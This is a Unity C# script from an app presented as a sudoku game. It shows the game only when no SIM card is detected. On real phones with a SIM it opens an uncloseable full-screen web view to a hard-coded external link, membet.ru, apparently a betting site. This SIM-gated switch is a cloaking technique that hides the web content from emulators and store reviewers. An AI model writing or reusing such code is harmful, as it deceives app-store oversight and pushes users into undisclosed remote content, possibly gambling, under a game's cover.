using UnityEngine;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

public class Viewer : MonoBehaviour
{
    UniWebView View { get; set; }

    bool Sim_Enable
    {
        get => Simcard.GetTwoSmallLetterCountryCodeISO().Length > 0;
    }

    delegate void ResultAction(bool IsGame);
    event ResultAction OnResultActionEvent;

    private const string url = "https://membet.ru/F1D5wbfz?id=com.sudoku.san";

    private void OnEnable()
    {
        OnResultActionEvent += Viewer_OnResultActionEvent;
    }

    private void OnDisable()
    {
        OnResultActionEvent -= Viewer_OnResultActionEvent;
    }

    private void Viewer_OnResultActionEvent(bool IsGame)
    {
        if(IsGame)
        {
            SceneManager.LoadScene(1);
        }
    }

    private void Awake()
    {
        Application.deepLinkActivated += OnDeepLinkActivated;
        if (!string.IsNullOrEmpty(Application.absoluteURL))
        {
            OnDeepLinkActivated(Application.absoluteURL);
        }
    }

    private void OnDeepLinkActivated(string url)
    {
        Debug.Log($"absoluteURL: {url}");
    }

    private void Start()
    {
        Screen.fullScreen = false;

        if(!Sim_Enable)
        {
            OnResultActionEvent?.Invoke(true);
        }
        else if(Application.internetReachability == NetworkReachability.NotReachable)
        {
            GameObject.Find("no connection").GetComponent<SpriteRenderer>().enabled = true;
            return;
        }

        Init(url);
    }

    void Init(string target)
    {
        View = gameObject.AddComponent<UniWebView>();

        View.ReferenceRectTransform = InitInterface();
        View.SetShowSpinnerWhileLoading(false);

        View.SetSupportMultipleWindows(true);

        View.OnMessageReceived += (browser, message) =>
        {
            if (message.Path.Equals("close"))
            {
                Application.Quit();
            }

            if (message.Path.Equals("accept"))
            {
                Destroy(View);
                View = null;

                OnResultActionEvent?.Invoke(true);
            }
        };

        View.BackgroundColor = Color.white;
        View.OnShouldClose += (v) => { return false; };
        View.OnPageStarted += (browser, url) => { View.Show(); View.UpdateFrame(); };

        View.OnPageFinished += (web, statusCode, url) =>
        {

        };

        View.Load(target);
    }

    RectTransform InitInterface()
    {
        GameObject _interface = new GameObject("Interface", typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));

        Canvas _canvas = _interface.GetComponent<Canvas>();
        _canvas.renderMode = RenderMode.ScreenSpaceCamera;
        _canvas.worldCamera = Camera.main;

        CanvasScaler _canvasScaler = _interface.GetComponent<CanvasScaler>();
        _canvasScaler.uiScaleMode = CanvasScaler.ScaleMode.ScaleWithScreenSize;
        _canvasScaler.referenceResolution = new Vector2(Screen.width, Screen.height);
        _canvasScaler.matchWidthOrHeight = 0.5f;

        GameObject activity = new GameObject("Privacy activity", typeof(RectTransform));
        activity.transform.SetParent(_interface.transform, false);
        RectTransform _rectTransform = activity.GetComponent<RectTransform>();

        _rectTransform.anchorMin = Vector2.zero;
        _rectTransform.anchorMax = Vector2.one;
        _rectTransform.pivot = Vector2.one / 2;
        _rectTransform.sizeDelta = Vector2.zero;
        _rectTransform.offsetMax = new Vector2(0, -Screen.height * 0.0409f);

        return _rectTransform;
    }
}
